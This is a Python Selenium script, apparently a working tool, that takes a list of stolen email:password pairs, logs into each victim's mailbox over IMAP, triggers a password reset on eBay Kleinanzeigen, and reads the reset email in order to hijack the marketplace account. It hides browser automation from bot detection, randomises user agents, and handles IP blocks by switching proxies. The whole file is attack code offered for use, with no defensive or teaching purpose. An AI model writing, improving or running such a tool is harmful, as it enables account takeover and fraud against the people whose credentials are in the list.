# Ebay Kleinanzeigen Resetter #BN
import atexit
import warnings

from selenium import webdriver
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC

import time
from time import sleep
from selenium.webdriver.chrome.options import Options
from fake_useragent import UserAgent
import socket

import imaplib
import email

warnings.filterwarnings('ignore')

def exit_handler():
    driver.quit()

def init_ImapConfig():
    global ImapConfig
    ImapConfig = {}
    try:
        with open("hoster.dat", "r") as f:
            for line in f:
                if len(line) > 1:
                    hoster = line.strip().split(':')
                    ImapConfig[hoster[0]] = (hoster[1], hoster[2])
    except BaseException:
        print("[ERROR] hoster.dat", "not found!")

def get_imapConfig(email):
    try:
        hoster = email.lower().split('@')[1]
        return ImapConfig[hoster]
    except BaseException:
        return False

def loadAccounts(path):
    global accounts
    accounts = open(path).read().splitlines()

def writeToDisk(path, text):
    file = open(path, 'w+', encoding='utf-8')
    file.write(text)
    file.close()

def checkImapLogin(username, password, check=False):
    socket.setdefaulttimeout(30)

    username = username.lower()

    host = get_imapConfig(username)

    try:
        if len(host) < 2:
            port = 993
        else:
            port = int(host[1])
        mail = imaplib.IMAP4_SSL(str(host[0]), port)
        a = str(mail.login(username, password))

        # check=True Mail wird abgerufen
        if not check:
            return a[2: 4]
        else:
            tries = 0
            while True:
                if tries == 5:
                    print("[+] Überprüfe Mails11..")
                    break

                print("[+] Überprüfe Mails..")

                try:
                    sleep(2)
                    mail.select("INBOX")
                    subject = 'Passwort zurücksetzen'

                    result, data = mail.search(None, '(UNSEEN FROM "noreply@ebay-kleinanzeigen.de")')

                    ids = data[0]  # data is a list.
                    id_list = ids.split()  # ids is a space separated string
                    latest_email_id = id_list[-1]  # get the latest

                    result, data = mail.fetch(latest_email_id,
                                              "(RFC822)")  # fetch the email body (RFC822) for the given ID

                    raw_email = data[0][1]
                    raw_email_string = raw_email.decode('utf-8')
                    #email_message = email.message_from_string(raw_email_string)
                    print(raw_email_string)

                    tries += 1
                    print(f"[+] Keine E-Mail gefunden.. warte 20 Sekunden.. | Versuch {str(tries)}/5")
                    sleep(20)
                except Exception as e:
                    print("Ein Fehler ist aufgetreten: " + str(e))


            print("[-] Keine E-Mail erhalten...")
    except imaplib.IMAP4.error:
        return False
    except BaseException:
        return "Error"

def getResettMail(browser, email):
    # Navigate to URL
    browser.get("https://www.ebay-kleinanzeigen.de/m-passwort-vergessen.html")

    # Daten laden
    sleep(5)

    # Email eingeben
    browser.find_element_by_id("resetpwd-email").send_keys(email)

    # Laden...
    sleep(2)

    # Submit Button
    browser.find_element_by_id("resetpwd-submit").click()

    # Laden...
    #sleep(5)

    if "E-Mail versendet" in browser.page_source:
        print("[+] Email erfolgreich versendet.. warte auf Email.")
        return True
    elif "eingeschränkt" in browser.page_source:
        print("[-] Nutzerkonto eingeschränkt.. überspringe Account.")
        return False
    elif "IP eingeschränkt bei eBay Kleinanzeigen" in browser.page_source:
        print("[!] IP-Adresse eingeschränkt. Wechsle Proxy..")
        return "PROXY"
    else:
        print("[-] Unbekannte Antwort.. überspringe Account.")
        return False



if __name__ == '__main__':
    print("### Ebay Kleianzeigen Passwort Master ###")
    print("[*] Lade Daten...")

    init_ImapConfig()

    ua = UserAgent(verify_ssl=False)
    userAgent = ua.random

    hostname = "192.151.150.174"
    port = "2000"

    global driver
    options = webdriver.ChromeOptions()
    options.add_argument("--disable-single-click-autofill");
    options.add_argument("--disable-autofill-keyboard-accessory-view[8]")
    options.add_argument(f'user-agent={userAgent}')
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    #options.add_argument('--proxy-server=%s' % hostname + ":" + port)
    driver = webdriver.Chrome("chromedriver.exe", options=options)

    driver.execute_cdp_cmd('Network.setUserAgentOverride', {
        "userAgent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.53 Safari/537.36'})

    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    driver.get("https://www.ebay-kleinanzeigen.de/")

    #sleep(4)

    # Cookies akzeptieren drücken
    #driver.find_element_by_id("gdpr-banner-accept").click()
    cookieButton = WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "gdpr-banner-accept")))
    cookieButton.click()

    loadAccounts(input("Pfad zur Mail:Pass Liste: "))

    print("[*] Daten erfolgreich geladen.. beginne resetts...")
    print("===================================================")

    for account in accounts:
        email = account.split(":")[0]
        password = account.split(":")[1]

        print("[+] Starte versuch... Benutzername: %s | Passwort: %s" % (email, password))

        print("[+] Versuche Postfach Login...")
        l = checkImapLogin(email, password)
        if l == 'OK':
            print("[+] Postfach Login erfolgreich.. fordere resettmail an...")
            m = getResettMail(driver, email)

            if m:
                print("[+] Warte auf E-Mail.. Timeout: 30 Sekunden")
                checkImapLogin(email, password, check=True)

atexit.register(exit_handler)

